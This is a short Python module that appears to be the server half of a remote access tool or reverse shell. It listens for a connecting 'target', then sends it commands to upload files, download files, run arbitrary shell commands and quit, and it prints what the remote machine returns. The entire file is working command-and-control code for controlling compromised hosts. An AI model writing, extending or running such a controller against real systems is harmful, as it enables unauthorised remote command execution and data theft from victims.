import socket
from . import cmd, comm, config, logger


def open_server(address: tuple[str, int]):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(address)
    logger.debug("[+] Listening for incoming connections", config.SERVER_VERBOSE)
    sock.listen(5)
    client, ip = sock.accept()
    logger.debug("[+] Target connected from: " + str(ip), config.SERVER_VERBOSE)
    return client, ip


def call_upload(client: socket.socket, args: tuple[str, ...]):
    comm.send(client, f"upload [{args[0]}] [{args[1]}]", config.SERVER_VERBOSE)
    cmd.upload(client, args, config.SERVER_VERBOSE)


def call_download(client: socket.socket, args: tuple[str, ...]):
    comm.send(client, f"download [{args[0]}] [{args[1]}]", config.SERVER_VERBOSE)
    cmd.download(client, args, config.SERVER_VERBOSE)


def call_exec(client: socket.socket, command: str) -> str:
    comm.send(client, f"exec [{command}]", config.SERVER_VERBOSE)
    data = comm.receive(client, False)
    print("[comm:receive]")
    print(data)
    return data


def call_quit(client: socket.socket):
    comm.send(client, "quit", config.SERVER_VERBOSE)
